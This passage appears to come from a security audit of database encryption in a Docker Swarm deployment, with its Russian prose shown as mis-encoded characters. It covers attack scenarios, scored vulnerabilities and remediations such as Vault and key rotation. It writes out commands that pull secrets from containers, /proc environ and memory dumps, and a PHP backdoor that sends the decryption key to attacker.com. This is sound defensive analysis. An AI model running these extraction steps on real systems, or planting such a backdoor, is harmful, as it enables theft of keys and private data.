**–í–µ–∫—Ç–æ—Ä –∞—Ç–∞–∫–∏:**
1. –£—è–∑–≤–∏–º–æ—Å—Ç—å –≤ Docker daemon
2. –≠–∫—Å–ø–ª—É–∞—Ç–∞—Ü–∏—è —É—è–∑–≤–∏–º–æ—Å—Ç–∏ –≤ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–∏ –¥–ª—è RCE
3. –°–∫–æ–º–ø—Ä–æ–º–µ—Ç–∏—Ä–æ–≤–∞–Ω–Ω—ã–π Docker API

**–®–∞–≥–∏ –∞—Ç–∞–∫–∏:**

```bash
# –®–ê–ì 1: –ü–æ–ª—É—á–µ–Ω–∏–µ –¥–æ—Å—Ç—É–ø–∞ –∫ Docker
$ docker ps | grep php-monolith
abc123def456  compass/php_monolith:latest  Up 2 hours

# –®–ê–ì 2: –í—Ö–æ–¥ –≤ –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä
$ docker exec -it abc123def456 bash

# –®–ê–ì 3: –ò–∑–≤–ª–µ—á–µ–Ω–∏–µ –∫–ª—é—á–µ–π (–≤—Å—ë —É–∂–µ –ø—Ä–∏–º–æ–Ω—Ç–∏—Ä–æ–≤–∞–Ω–æ!)
container# cat /run/secrets/compass_database_encryption_secret_key
U2FsdGVkX1+aGVsbG93b3JsZGhlbGxvd29ybGRoZWxs...

container# echo $DATABASE_ENCRYPTION_MASTER_KEY
bWFzdGVya2V5bWFzdGVya2V5bWFzdGVya2V5bWFz

# –®–ê–ì 4: –ü–æ–∏—Å–∫ —Ä–∞—Å—à–∏—Ñ—Ä–æ–≤–∞–Ω–Ω–æ–≥–æ DEK –≤ –ø–∞–º—è—Ç–∏ –ø—Ä–æ—Ü–µ—Å—Å–∞
container# ps aux | grep php-fpm
root   1  0.0  0.5  php-fpm: master process

# –î–∞–º–ø –ø–∞–º—è—Ç–∏ (–µ—Å–ª–∏ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω gdb)
container# gdb -p 1
(gdb) generate-core-file /tmp/core.1
(gdb) quit

container# strings /tmp/core.1 | grep -E '[A-Za-z0-9]{32,}'
# –ú–æ–∂–µ—Ç —Å–æ–¥–µ—Ä–∂–∞—Ç—å —Ä–∞—Å—à–∏—Ñ—Ä–æ–≤–∞–Ω–Ω—ã–π DEK –≤ plaintext!

# –®–ê–ì 5: –ê–ª—å—Ç–µ—Ä–Ω–∞—Ç–∏–≤–∞ - –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å —Å—É—â–µ—Å—Ç–≤—É—é—â–µ–µ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–µ –∫ –ë–î
container# mysql -h mysql-monolith -u company_user -p'CompanyPassword'
mysql> SELECT * FROM company_conversation.message_block_12;

# –®–ê–ì 6: –†–∞—Å—à–∏—Ñ—Ä–æ–≤–∫–∞ (–∏—Å–ø–æ–ª—å–∑—É—è –Ω–∞–π–¥–µ–Ω–Ω—ã–µ –∫–ª—é—á–∏)
# ... –∞–Ω–∞–ª–æ–≥–∏—á–Ω–æ –°—Ü–µ–Ω–∞—Ä–∏—é 3 ...
```

**–£—Ä–æ–≤–µ–Ω—å —É–≥—Ä–æ–∑—ã:** üî¥ –ö–†–ò–¢–ò–ß–ï–°–ö–ò–ô

**–°–ª–æ–∂–Ω–æ—Å—Ç—å –≤–∑–ª–æ–º–∞:** üü¢ –ù–ò–ó–ö–ê–Ø

**–í—Ä–µ–º—è –Ω–∞ –≤–∑–ª–æ–º:** 2-5 –º–∏–Ω—É—Ç

**–ü—Ä–∏–º–µ—á–∞–Ω–∏–µ:** –†–∞—Å—à–∏—Ñ—Ä–æ–≤–∞–Ω–Ω—ã–π DEK –º–æ–∂–µ—Ç —Ö—Ä–∞–Ω–∏—Ç—å—Å—è –≤ –ø–∞–º—è—Ç–∏ –ø—Ä–æ—Ü–µ—Å—Å–∞ PHP/Go –≤ –æ—Ç–∫—Ä—ã—Ç–æ–º –≤–∏–¥–µ!

---

### –°—Ü–µ–Ω–∞—Ä–∏–π 5: –§–∏–∑–∏—á–µ—Å–∫–∏–π –¥–æ—Å—Ç—É–ø –∫ —Å–µ—Ä–≤–µ—Ä—É

**–í–µ–∫—Ç–æ—Ä –∞—Ç–∞–∫–∏:**
1. –ö—Ä–∞–∂–∞ —Å–µ—Ä–≤–µ—Ä–∞ –∏–∑ –¶–û–î
2. –î–æ—Å—Ç—É–ø –∫ —Å–µ—Ä–≤–µ—Ä–Ω–æ–π –∫–æ–º–Ω–∞—Ç–µ
3. –ò–∑—ä—è—Ç–∏–µ –¥–∏—Å–∫–∞

**–®–∞–≥–∏ –∞—Ç–∞–∫–∏:**

```bash
# –®–ê–ì 1: –ó–∞–≥—Ä—É–∑–∫–∞ —Å Live USB
# (–µ—Å–ª–∏ –¥–∏—Å–∫ –Ω–µ –∑–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω –Ω–∞ —É—Ä–æ–≤–Ω–µ –û–°)

# –®–ê–ì 2: –ú–æ–Ω—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ —Ä–∞–∑–¥–µ–ª–∞
$ mount /dev/sda1 /mnt/compass

# –®–ê–ì 3: –ò–∑–≤–ª–µ—á–µ–Ω–∏–µ –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏–∏
$ cat /mnt/compass/opt/compass/configs/database.yaml

# –®–ê–ì 4: –ò–∑–≤–ª–µ—á–µ–Ω–∏–µ Docker Swarm Raft database
$ cp /mnt/compass/var/lib/docker/swarm/raft/*.db /tmp/

# Raft DB —Å–æ–¥–µ—Ä–∂–∏—Ç –≤—Å–µ secrets –≤ –∑–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω–Ω–æ–º –≤–∏–¥–µ,
# –Ω–æ –∫–ª—é—á —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏—è —Ö—Ä–∞–Ω–∏—Ç—Å—è –ª–æ–∫–∞–ª—å–Ω–æ!

# –®–ê–ì 5: –ò–∑–≤–ª–µ—á–µ–Ω–∏–µ –∫–ª—é—á–∞ —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏—è Swarm
$ cat /mnt/compass/var/lib/docker/swarm/certificates/swarm-node.key
# TLS private key –¥–ª—è —Ä–∞—Å—à–∏—Ñ—Ä–æ–≤–∫–∏ Raft DB

# –®–ê–ì 6: –†–∞—Å—à–∏—Ñ—Ä–æ–≤–∫–∞ Raft DB –∏ –∏–∑–≤–ª–µ—á–µ–Ω–∏–µ secrets
# (—Ç—Ä–µ–±—É–µ—Ç—Å—è reverse engineering —Ñ–æ—Ä–º–∞—Ç–∞ Raft DB)

# –®–ê–ì 7: –ü–æ–ª—É—á–µ–Ω–∏–µ –¥–∞–º–ø–∞ –ë–î
$ cat /mnt/compass/var/lib/docker/volumes/*/backups/latest.sql
```

**–£—Ä–æ–≤–µ–Ω—å —É–≥—Ä–æ–∑—ã:** üî¥ –ö–†–ò–¢–ò–ß–ï–°–ö–ò–ô

**–°–ª–æ–∂–Ω–æ—Å—Ç—å –≤–∑–ª–æ–º–∞:** üü° –°–†–ï–î–ù–Ø–Ø

**–í—Ä–µ–º—è –Ω–∞ –≤–∑–ª–æ–º:** 10-20 –º–∏–Ω—É—Ç (–µ—Å–ª–∏ –Ω–µ—Ç FDE)

**–ó–∞—â–∏—Ç–∞:**
- ‚ùå –û—Ç—Å—É—Ç—Å—Ç–≤—É–µ—Ç Full Disk Encryption (FDE)
- ‚ùå –ù–µ—Ç TPM-based Secure Boot
- ‚ùå –ù–µ—Ç hardware-–∑–∞—â–∏—â–µ–Ω–Ω–æ–≥–æ —Ö—Ä–∞–Ω–∏–ª–∏—â–∞ –∫–ª—é—á–µ–π

---

### –°—Ü–µ–Ω–∞—Ä–∏–π 6: –ò–Ω—Å–∞–π–¥–µ—Ä—Å–∫–∞—è —É–≥—Ä–æ–∑–∞ (–∑–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫-—Ä–∞–∑—Ä–∞–±–æ—Ç—á–∏–∫)

**–í–µ–∫—Ç–æ—Ä –∞—Ç–∞–∫–∏:**
- –†–∞–∑—Ä–∞–±–æ—Ç—á–∏–∫ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è —Å –¥–æ—Å—Ç—É–ø–æ–º –∫ –∏—Å—Ö–æ–¥–Ω–æ–º—É –∫–æ–¥—É

**–í–æ–∑–º–æ–∂–Ω–æ—Å—Ç–∏:**

```php
// –ó–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫ –¥–æ–±–∞–≤–ª—è–µ—Ç –±—ç–∫–¥–æ—Ä –≤ –∫–æ–¥ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è:

// –í —Ñ–∞–π–ª–µ src/Compass/Conversation/api/domain/Message.php
class Message {

    public function decrypt($encrypted_message) {
        $dek = $this->getDEK(); // –ü–æ–ª—É—á–µ–Ω–∏–µ –∫–ª—é—á–∞

        // –ë–≠–ö–î–û–†: –æ—Ç–ø—Ä–∞–≤–∫–∞ –∫–ª—é—á–∞ –Ω–∞ –≤–Ω–µ—à–Ω–∏–π —Å–µ—Ä–≤–µ—Ä
        file_get_contents(
            'https://attacker.com/log.php?key=' . base64_encode($dek)
        );

        // –û–±—ã—á–Ω–∞—è —Ä–∞—Å—à–∏—Ñ—Ä–æ–≤–∫–∞
        return openssl_decrypt($encrypted_message, 'aes-256-cbc', $dek, ...);
    }
}
```

**–£—Ä–æ–≤–µ–Ω—å —É–≥—Ä–æ–∑—ã:** üî¥ –ö–†–ò–¢–ò–ß–ï–°–ö–ò–ô

**–°–ª–æ–∂–Ω–æ—Å—Ç—å –æ–±–Ω–∞—Ä—É–∂–µ–Ω–∏—è:** üî¥ –í–´–°–û–ö–ê–Ø (—Ç—Ä–µ–±—É–µ—Ç—Å—è code review)

**–ó–∞—â–∏—Ç–∞:**
- –ü—Ä–æ–≤–µ—Ä–∫–∞ –∫–æ–¥–∞ (code review)
- –ú–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥ –∏—Å—Ö–æ–¥—è—â–µ–≥–æ —Ç—Ä–∞—Ñ–∏–∫–∞
- –†–µ–≥—É–ª—è—Ä–Ω—ã–µ –∞—É–¥–∏—Ç—ã –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏

---

## –ö—Ä–∏—Ç–∏—á–µ—Å–∫–∏–µ —É—è–∑–≤–∏–º–æ—Å—Ç–∏

### üî¥ –£–Ø–ó–í–ò–ú–û–°–¢–¨ #1: –ú–∞—Å—Ç–µ—Ä-–∫–ª—é—á —Ö—Ä–∞–Ω–∏—Ç—Å—è –Ω–∞ —Ç–æ–º –∂–µ —Å–µ—Ä–≤–µ—Ä–µ

**–§–∞–π–ª:** `yaml_template/configs/database.tpl.yaml:64-66`

```yaml
database_encryption:
  mode: "read_write"
  master_key: ""  # ‚Üê –•—Ä–∞–Ω–∏—Ç—Å—è –≤ –æ—Ç–∫—Ä—ã—Ç–æ–º –≤–∏–¥–µ!
```

**–ü—Ä–æ–±–ª–µ–º–∞:**
- –ú–∞—Å—Ç–µ—Ä-–∫–ª—é—á –≤ –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏–æ–Ω–Ω–æ–º —Ñ–∞–π–ª–µ (base64, –Ω–µ –∑–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω)
- –î–æ—Å—Ç—É–ø–µ–Ω –ª—é–±–æ–º—É –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—é —Å root-–ø—Ä–∏–≤–∏–ª–µ–≥–∏—è–º–∏
- –ü–µ—Ä–µ–¥–∞–µ—Ç—Å—è —á–µ—Ä–µ–∑ –ø–µ—Ä–µ–º–µ–Ω–Ω—ã–µ –æ–∫—Ä—É–∂–µ–Ω–∏—è (–≤–∏–¥–Ω–æ –≤ `/proc/`)

**–í–æ–∑–¥–µ–π—Å—Ç–≤–∏–µ:**
- Root-–¥–æ—Å—Ç—É–ø = –Ω–µ–º–µ–¥–ª–µ–Ω–Ω–∞—è –∫–æ–º–ø—Ä–æ–º–µ—Ç–∞—Ü–∏—è

**–†–µ–∫–æ–º–µ–Ω–¥–∞—Ü–∏—è –ø–æ —É—Å—Ç—Ä–∞–Ω–µ–Ω–∏—é:**
```yaml
# –í–ê–†–ò–ê–ù–¢ 1: –í–Ω–µ—à–Ω–∏–π KMS
database_encryption:
  mode: "read_write"
  kms_provider: "vault"
  kms_endpoint: "https://vault.company.local:8200"
  kms_key_id: "compass-master-key-v1"

# –í–ê–†–ò–ê–ù–¢ 2: Manual unlock
database_encryption:
  mode: "read_write"
  unlock_method: "manual"  # –¢—Ä–µ–±–æ–≤–∞—Ç—å –≤–≤–æ–¥ –ø—Ä–∏ —Å—Ç–∞—Ä—Ç–µ
```

**–û—Ü–µ–Ω–∫–∞ —Ä–∏—Å–∫–∞:** üî¥ –ö–†–ò–¢–ò–ß–ï–°–ö–ò–ô (CVSS: 9.1)

---

### üî¥ –£–Ø–ó–í–ò–ú–û–°–¢–¨ #2: Docker Secret –Ω–µ –∑–∞—â–∏—â–∞–µ—Ç –æ—Ç root

**–§–∞–π–ª:** `script/create_secret.py:66-68`

```python
def create_docker_secret(name: str, value: bytes):
    """—Å–æ–∑–¥–∞–µ—Ç –¥–æ–∫–µ—Ä-—Å–µ–∫—Ä–µ—Ç"""
    docker_client.secrets.create(name=name, data=value)
```

**–ü—Ä–æ–±–ª–µ–º–∞:**
- Docker Secrets –∑–∞—â–∏—â–∞—é—Ç –æ—Ç –æ–±—ã—á–Ω—ã—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π, –ù–ï –æ—Ç root
- Root –º–æ–∂–µ—Ç –≤—ã–ø–æ–ª–Ω–∏—Ç—å: `docker secret inspect <name>`
- Secrets —Ö—Ä–∞–Ω—è—Ç—Å—è –≤ Raft DB –Ω–∞ –¥–∏—Å–∫–µ –≤ –∑–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω–Ω–æ–º –≤–∏–¥–µ, –Ω–æ –∫–ª—é—á —Ç–æ–∂–µ –ª–æ–∫–∞–ª—å–Ω—ã–π

**–ò–∑–≤–ª–µ—á–µ–Ω–∏–µ secret —Å –ø—Ä–∞–≤–∞–º–∏ root:**

```bash
# –ú–µ—Ç–æ–¥ 1: –ß–µ—Ä–µ–∑ Docker API
$ docker secret inspect compass_database_encryption_secret_key \
  --format='{{.Spec.Data}}'

# –ú–µ—Ç–æ–¥ 2: –ò–∑ –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä–∞
$ docker exec $(docker ps -q -f name=php-monolith) \
  cat /run/secrets/compass_database_encryption_secret_key

# –ú–µ—Ç–æ–¥ 3: –ò–∑ Raft database
$ strings /var/lib/docker/swarm/raft/snap-*.db | grep -A10 compass_database
```

**–í–æ–∑–¥–µ–π—Å—Ç–≤–∏–µ:**
- False sense of security (–ª–æ–∂–Ω–æ–µ —á—É–≤—Å—Ç–≤–æ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏)
- –ê–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä—ã –º–æ–≥—É—Ç –¥—É–º–∞—Ç—å, —á—Ç–æ secrets "–∑–∞—â–∏—â–µ–Ω—ã"

**–†–µ–∫–æ–º–µ–Ω–¥–∞—Ü–∏—è:**
- –ò—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –≤–Ω–µ—à–Ω–∏–π Secrets Manager (HashiCorp Vault, AWS Secrets Manager)
- –ù–µ –ø–æ–ª–∞–≥–∞—Ç—å—Å—è –Ω–∞ Docker Secrets –¥–ª—è –∑–∞—â–∏—Ç—ã –æ—Ç –ø—Ä–∏–≤–∏–ª–µ–≥–∏—Ä–æ–≤–∞–Ω–Ω—ã—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π

**–û—Ü–µ–Ω–∫–∞ —Ä–∏—Å–∫–∞:** üü° –í–´–°–û–ö–ò–ô (CVSS: 7.5)

---

### üü° –£–Ø–ó–í–ò–ú–û–°–¢–¨ #3: –û—Ç—Å—É—Ç—Å—Ç–≤–∏–µ —Ä–æ—Ç–∞—Ü–∏–∏ –∫–ª—é—á–µ–π

**–§–∞–π–ª:** `script/validate_db_configuration.py:397-403`

```python
def compare(self):
    """–ü—Ä–æ–≤–µ—Ä—è–µ—Ç –¥–≤–µ –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏–∏ –Ω–∞ —Å–æ–≤–º–µ—Å—Ç–∏–º–æ—Å—Ç—å"""

    if self.existing.cnf.get("use_encryption") is True and \
       self.passed.cnf.get("use_encryption") is False:
        return False, "–ù–µ–æ–±—Ö–æ–¥–∏–º–æ –≤–∫–ª—é—á–∏—Ç—å —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏–µ –ë–î"

    return True, ""
```

**–ü—Ä–æ–±–ª–µ–º–∞:**
- –ü–æ—Å–ª–µ –≤–∫–ª—é—á–µ–Ω–∏—è —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏—è –Ω–µ–ª—å–∑—è –æ—Ç–∫–ª—é—á–∏—Ç—å
- –ù–ï–¢ –º–µ—Ö–∞–Ω–∏–∑–º–∞ —Ä–æ—Ç–∞—Ü–∏–∏ –∫–ª—é—á–µ–π
- –ù–ï–¢ –≤–æ–∑–º–æ–∂–Ω–æ—Å—Ç–∏ –ø–µ—Ä–µ—à–∏—Ñ—Ä–æ–≤–∞–Ω–∏—è –¥–∞–Ω–Ω—ã—Ö –Ω–æ–≤—ã–º –∫–ª—é—á–æ–º

**–ü–æ—Å–ª–µ–¥—Å—Ç–≤–∏—è:**
- –ï—Å–ª–∏ –∫–ª—é—á —Å–∫–æ–º–ø—Ä–æ–º–µ—Ç–∏—Ä–æ–≤–∞–Ω ‚Üí –í–°–ï –∏—Å—Ç–æ—Ä–∏—á–µ—Å–∫–∏–µ –¥–∞–Ω–Ω—ã–µ —Å–∫–æ–º–ø—Ä–æ–º–µ—Ç–∏—Ä–æ–≤–∞–Ω—ã
- –ù–µ–≤–æ–∑–º–æ–∂–Ω–æ "–æ—Ç–æ–∑–≤–∞—Ç—å" —Å—Ç–∞—Ä—ã–π –∫–ª—é—á
- –ù–∞—Ä—É—à–µ–Ω–∏–µ compliance —Ç—Ä–µ–±–æ–≤–∞–Ω–∏–π (PCI DSS, GDPR —Ç—Ä–µ–±—É—é—Ç —Ä–æ—Ç–∞—Ü–∏—é)

**–†–µ–∫–æ–º–µ–Ω–¥–∞—Ü–∏—è:**

```python
# –î–æ–±–∞–≤–∏—Ç—å –ø–æ–¥–¥–µ—Ä–∂–∫—É –º–Ω–æ–∂–µ—Å—Ç–≤–µ–Ω–Ω—ã—Ö –∫–ª—é—á–µ–π —Å –≤–µ—Ä—Å–∏–æ–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ–º
database_encryption:
  mode: "read_write"
  active_key_version: 2
  keys:
    - version: 1
      created_at: "2023-01-01"
      deprecated_at: "2024-01-01"  # –¢–æ–ª—å–∫–æ —á—Ç–µ–Ω–∏–µ
      master_key: "..."
    - version: 2
      created_at: "2024-01-01"
      active: true  # –ó–∞–ø–∏—Å—å –Ω–æ–≤—ã—Ö –¥–∞–Ω–Ω—ã—Ö
      master_key: "..."
```

**–û—Ü–µ–Ω–∫–∞ —Ä–∏—Å–∫–∞:** üü° –°–†–ï–î–ù–ò–ô (CVSS: 6.5)

---

### üü° –£–Ø–ó–í–ò–ú–û–°–¢–¨ #4: –ö–ª—é—á–∏ –≤ –ø–µ—Ä–µ–º–µ–Ω–Ω—ã—Ö –æ–∫—Ä—É–∂–µ–Ω–∏—è

**–§–∞–π–ª:** `src/domino/variable/common.goenv:139-140`

```env
DATABASE_ENCRYPTION_MASTER_KEY={{.database_encryption.master_key}}
DATABASE_ENCRYPTION_MODE={{.database_encryption.mode}}
```

**–ü—Ä–æ–±–ª–µ–º–∞:**
- –ü–µ—Ä–µ–º–µ–Ω–Ω—ã–µ –æ–∫—Ä—É–∂–µ–Ω–∏—è –≤–∏–¥–Ω—ã –≤ `/proc/<pid>/environ`
- –õ–æ–≥–∏—Ä—É—é—Ç—Å—è –≤ `docker inspect`
- –ú–æ–≥—É—Ç –ø–æ–ø–∞—Å—Ç—å –≤ crash dumps / error reports

**–ò–∑–≤–ª–µ—á–µ–Ω–∏–µ:**

```bash
# –ò–∑ —Ö–æ—Å—Ç–∞:
$ docker inspect abc123def456 | grep DATABASE_ENCRYPTION_MASTER_KEY

# –ò–∑ –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä–∞:
$ cat /proc/1/environ | strings | grep DATABASE_ENCRYPTION_MASTER_KEY

# –ò–∑ –¥—Ä—É–≥–æ–≥–æ –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä–∞ –≤ —Ç–æ–π –∂–µ —Å–µ—Ç–∏:
$ docker run --rm --pid=container:abc123def456 alpine \
  cat /proc/1/environ | strings | grep DATABASE_ENCRYPTION
```

**–†–µ–∫–æ–º–µ–Ω–¥–∞—Ü–∏—è:**
- –ü–µ—Ä–µ–¥–∞–≤–∞—Ç—å –∫–ª—é—á–∏ —á–µ—Ä–µ–∑ –∑–∞—â–∏—â–µ–Ω–Ω—ã–µ –∫–∞–Ω–∞–ª—ã (Docker Secrets, mounted files)
- –ù–ï –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –ø–µ—Ä–µ–º–µ–Ω–Ω—ã–µ –æ–∫—Ä—É–∂–µ–Ω–∏—è –¥–ª—è —Å–µ–∫—Ä–µ—Ç–æ–≤

**–û—Ü–µ–Ω–∫–∞ —Ä–∏—Å–∫–∞:** üü° –°–†–ï–î–ù–ò–ô (CVSS: 6.0)

---

### üü¢ –£–Ø–ó–í–ò–ú–û–°–¢–¨ #5: –û—Ç—Å—É—Ç—Å—Ç–≤–∏–µ –∑–∞—â–∏—Ç—ã –ø–∞–º—è—Ç–∏

**–ü—Ä–æ–±–ª–µ–º–∞:**
- –†–∞—Å—à–∏—Ñ—Ä–æ–≤–∞–Ω–Ω—ã–π DEK —Ö—Ä–∞–Ω–∏—Ç—Å—è –≤ –ø–∞–º—è—Ç–∏ –ø—Ä–æ—Ü–µ—Å—Å–∞ –≤ plaintext
- –ù–µ—Ç –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è `mlock()` –¥–ª—è –ø—Ä–µ–¥–æ—Ç–≤—Ä–∞—â–µ–Ω–∏—è swapping
- –ù–µ—Ç –æ—á–∏—Å—Ç–∫–∏ –ø–∞–º—è—Ç–∏ –ø–æ—Å–ª–µ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è –∫–ª—é—á–∞
- –£—è–∑–≤–∏–º–æ—Å—Ç—å –∫ memory dump –∞—Ç–∞–∫–∞–º

**–ò–∑–≤–ª–µ—á–µ–Ω–∏–µ –∏–∑ –ø–∞–º—è—Ç–∏:**

```bash
# –î–∞–º–ø –ø–∞–º—è—Ç–∏ –ø—Ä–æ—Ü–µ—Å—Å–∞
$ gcore <php-fpm-pid>

# –ü–æ–∏—Å–∫ –∫–ª—é—á–∞ –≤ –¥–∞–º–ø–µ
$ strings core.<pid> | grep -E '^[A-Za-z0-9+/]{43}=$'

# –ú–æ–∂–µ—Ç –Ω–∞–π—Ç–∏ —Ä–∞—Å—à–∏—Ñ—Ä–æ–≤–∞–Ω–Ω—ã–π DEK –≤ plaintext!
```

**–†–µ–∫–æ–º–µ–Ω–¥–∞—Ü–∏—è:**
```c
// –í C/C++ –º–æ–¥—É–ª—è—Ö:
#include <sys/mman.h>

// –ë–ª–æ–∫–∏—Ä–æ–≤–∫–∞ —Å—Ç—Ä–∞–Ω–∏—Ü –ø–∞–º—è—Ç–∏
char sensitive_key[32];
mlock(sensitive_key, sizeof(sensitive_key));

// –ü–æ—Å–ª–µ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è
memset_s(sensitive_key, sizeof(sensitive_key), 0, sizeof(sensitive_key));
munlock(sensitive_key, sizeof(sensitive_key));
```

**–û—Ü–µ–Ω–∫–∞ —Ä–∏—Å–∫–∞:** üü¢ –ù–ò–ó–ö–ò–ô (CVSS: 4.5, —Ç—Ä–µ–±—É–µ—Ç—Å—è –ª–æ–∫–∞–ª—å–Ω—ã–π –¥–æ—Å—Ç—É–ø)

---

### üü¢ –£–Ø–ó–í–ò–ú–û–°–¢–¨ #6: –°–ª–∞–±–∞—è –¥–µ—Ä–∏–≤–∞—Ü–∏—è –∫–ª—é—á–∞ –¥–ª—è —Å—Ç–∞—Ä—ã—Ö –¥–∞–Ω–Ω—ã—Ö

**–§–∞–π–ª:** `script/create_secret.py:26`

```python
pbk = pbkdf2_hmac('sha256', password, salt, 10000, 48)
```

**–ü—Ä–æ–±–ª–µ–º–∞:**
- 10000 –∏—Ç–µ—Ä–∞—Ü–∏–π PBKDF2 - –º–∏–Ω–∏–º—É–º –¥–ª—è 2024 –≥–æ–¥–∞
- NIST —Ä–µ–∫–æ–º–µ–Ω–¥—É–µ—Ç 600,000+ –∏—Ç–µ—Ä–∞—Ü–∏–π –¥–ª—è PBKDF2-HMAC-SHA256
- –£—è–∑–≤–∏–º–æ –∫ GPU-—É—Å–∫–æ—Ä–µ–Ω–Ω–æ–º—É –±—Ä—É—Ç—Ñ–æ—Ä—Å—É (–µ—Å–ª–∏ –º–∞—Å—Ç–µ—Ä-–∫–ª—é—á —Å–ª–∞–±—ã–π)

**–û—Ü–µ–Ω–∫–∞:**
- –ü—Ä–∏ —Å–∏–ª—å–Ω–æ–º —Å–ª—É—á–∞–π–Ω–æ–º –º–∞—Å—Ç–µ—Ä-–∫–ª—é—á–µ (256 –±–∏—Ç) - –Ω–µ –∫—Ä–∏—Ç–∏—á–Ω–æ
- –ü—Ä–∏ —Å–ª–∞–±–æ–º –ø–∞—Ä–æ–ª–µ (–ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –≤–≤–µ–ª –≤—Ä—É—á–Ω—É—é) - —É—è–∑–≤–∏–º–æ

**–†–µ–∫–æ–º–µ–Ω–¥–∞—Ü–∏—è:**
```python
# –£–≤–µ–ª–∏—á–∏—Ç—å —á–∏—Å–ª–æ –∏—Ç–µ—Ä–∞—Ü–∏–π
pbk = pbkdf2_hmac('sha256', password, salt, 600000, 48)

# –ò–õ–ò –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å Argon2id
from argon2 import PasswordHasher
ph = PasswordHasher(
    time_cost=3,
    memory_cost=65536,
    parallelism=4
)
```

**–û—Ü–µ–Ω–∫–∞ —Ä–∏—Å–∫–∞:** üü¢ –ù–ò–ó–ö–ò–ô (CVSS: 3.5, —Ç–æ–ª—å–∫–æ –µ—Å–ª–∏ –º–∞—Å—Ç–µ—Ä-–∫–ª—é—á —Å–ª–∞–±—ã–π)

---

## –†–µ–∫–æ–º–µ–Ω–¥–∞—Ü–∏–∏ –ø–æ —É–ª—É—á—à–µ–Ω–∏—é

### üéØ –ü–†–ò–û–†–ò–¢–ï–¢ 1: –†–∞–∑–¥–µ–ª–µ–Ω–∏–µ –∫–ª—é—á–µ–π (Key Separation)

**–ü—Ä–æ–±–ª–µ–º–∞:** –ú–∞—Å—Ç–µ—Ä-–∫–ª—é—á –∏ –∑–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω–Ω—ã–π DEK —Ö—Ä–∞–Ω—è—Ç—Å—è –Ω–∞ –æ–¥–Ω–æ–º —Å–µ—Ä–≤–µ—Ä–µ.

**–†–µ—à–µ–Ω–∏–µ:**

#### –í–∞—Ä–∏–∞–Ω—Ç A: HashiCorp Vault (—Ä–µ–∫–æ–º–µ–Ω–¥—É–µ—Ç—Å—è)

```yaml
# configs/database.yaml
database_encryption:
  mode: "read_write"
  key_management: "vault"
  vault:
    address: "https://vault.company.local:8200"
    role: "compass-encryption"
    secret_path: "secret/compass/dek"
    approle:
      role_id: "${VAULT_ROLE_ID}"  # –ò–∑ Docker Secret
      secret_id: "${VAULT_SECRET_ID}"  # –ò–∑ Docker Secret
```

**–ü—Ä–µ–∏–º—É—â–µ—Å—Ç–≤–∞:**
- –ö–ª—é—á–∏ –ù–ï —Ö—Ä–∞–Ω—è—Ç—Å—è –Ω–∞ —Å–µ—Ä–≤–µ—Ä–µ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è
- –¶–µ–Ω—Ç—Ä–∞–ª–∏–∑–æ–≤–∞–Ω–Ω–æ–µ —É–ø—Ä–∞–≤–ª–µ–Ω–∏–µ
- –ê—É–¥–∏—Ç –¥–æ—Å—Ç—É–ø–∞ –∫ –∫–ª—é—á–∞–º
- –ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∞—è —Ä–æ—Ç–∞—Ü–∏—è
- Revocation (–æ—Ç–∑—ã–≤ —Å–∫–æ–º–ø—Ä–æ–º–µ—Ç–∏—Ä–æ–≤–∞–Ω–Ω—ã—Ö –∫–ª—é—á–µ–π)

**–ò–º–ø–ª–µ–º–µ–Ω—Ç–∞—Ü–∏—è:**

```python
# script/vault_integration.py
import hvac

class VaultKeyProvider:
    def __init__(self, vault_addr, role_id, secret_id):
        self.client = hvac.Client(url=vault_addr)
        self.client.auth.approle.login(
            role_id=role_id,
            secret_id=secret_id
        )

    def get_dek(self, version='latest'):
        """–ü–æ–ª—É—á–∏—Ç—å DEK –∏–∑ Vault"""
        secret = self.client.secrets.kv.v2.read_secret_version(
            path='compass/dek',
            version=version
        )
        return secret['data']['data']['key']

    def rotate_key(self):
        """–°–æ–∑–¥–∞—Ç—å –Ω–æ–≤—É—é –≤–µ—Ä—Å–∏—é –∫–ª—é—á–∞"""
